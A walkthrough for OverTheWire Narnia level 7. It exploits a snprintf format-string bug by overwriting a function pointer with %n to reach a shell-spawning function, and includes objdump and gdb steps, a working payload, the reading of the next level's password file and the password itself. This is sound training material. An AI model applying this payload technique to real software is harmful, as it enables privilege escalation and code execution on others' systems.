# Narnia Level 7 → 8

## Goal

Like level 5, there's a `snprintf` format-string bug. This time you overwrite a **function pointer** called `ptrf` with the address of `hackedfunction()` — which the source conveniently defines for you. When the binary calls `ptrf(...)`, your `hackedfunction` runs, which spawns a shell.

## Concepts you'll learn

- Using a format-string write (`%n`) to overwrite a function pointer
- Computing the field-width number when the target value is large (e.g., an address like `0x08048724`)
- Using `objdump` to find the address of a function symbol

## Walkthrough

### 1. Read the source

```c
int hackedfunction(unsigned long cookie){
    setreuid(geteuid(), geteuid());
    printf("Wait wat?! ... You must have hacked it, here, have a shell!\n");
    system("/bin/sh");
    return 0;
}

int goodfunction(unsigned long cookie){
    printf("Good function... Address = %p\n", goodfunction);
    return 0;
}

int main(int argc, char *argv[]){
    char buf[44];
    int (*ptrf)(unsigned long cookie);
    ptrf = goodfunction;
    // ...
    snprintf(buf, sizeof(buf), argv[1]);
    buf[sizeof(buf)-1] = 0;
    // ...
    ptrf(some_arg);
    return 0;
}
```

`ptrf` initially points at `goodfunction`. We want it to point at `hackedfunction`.

### 2. Find the addresses you need

`objdump` reveals `hackedfunction`:

```bash
$ objdump -d /narnia/narnia7 | grep -A1 '<hackedfunction>:'
08048724 <hackedfunction>:
```

`ptrf`'s address on the stack is typically printed by the binary as a debug line. If not, find it in `gdb`:

```bash
$ gdb -q /narnia/narnia7
(gdb) b main
(gdb) run AAAA
(gdb) p &ptrf
$1 = (int (**)(unsigned long)) 0xffffd638
```

### 3. Build the format-string payload

Target address: `0xffffd638`. Target value: `0x08048724`.

- First 4 bytes of input = `\x38\xd6\xff\xff` (little-endian address).
- After that, padding to make the printed byte count equal `0x08048724` = 134,514,468, minus the 4 bytes already emitted = **134,514,464**.
- Then `%N$n` where `N` is the parameter index of your address word.

Find the parameter index with the same trick as level 5 (`%x %x %x ...` until you see your bytes). Axcheron used index 2: `%2$n`.

```bash
$ P=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x38\xd6\xff\xff" + b"%134514464d%2$n")')
$ /narnia/narnia7 "$P"
```

### 4. Wait 30 seconds

The payload causes `snprintf` to chew through a 134-million-character format — it takes several seconds. When it finishes, `ptrf` points at `hackedfunction`, the later call runs it, and you get a shell:

```bash
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
mohthuphog
```

> Note: writing a whole 4-byte value with one `%n` is slow and memory-hungry. A more elegant technique is to split the write into two `%hn` (2-byte) operations — one for the low half of the address, one for the high half. That's what you'd do on a binary whose output is buffered into a smaller space. For Narnia 7, the single `%n` approach works.

## The answer

The password for `narnia8` is:

**`mohthuphog`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia7.html>
